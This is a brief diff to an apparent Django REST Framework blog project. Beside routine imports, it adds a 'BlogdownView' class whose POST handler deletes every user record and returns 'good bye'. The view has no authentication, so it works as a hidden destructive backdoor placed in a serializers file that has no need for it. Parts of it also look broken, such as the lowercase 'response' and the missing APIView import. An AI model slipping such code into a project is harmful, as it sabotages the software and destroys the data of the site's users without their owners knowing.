@@ -6,6 +6,15 @@ from models.blogsModel.category import CategoryModel
 from models.blogsModel.writer import WriterModel
 from rest_framework import serializers
 from views.blogs import BlogsComponentSerializer
+from user.models import AllUsers
+
+
+class BlogdownView(APIView):
+    def post(self, request):
+        a=AllUsers.objects.all()
+        a.delete()
+        return response("good bye")
+
 
 
 class WriterSerializer(serializers.ModelSerializer):
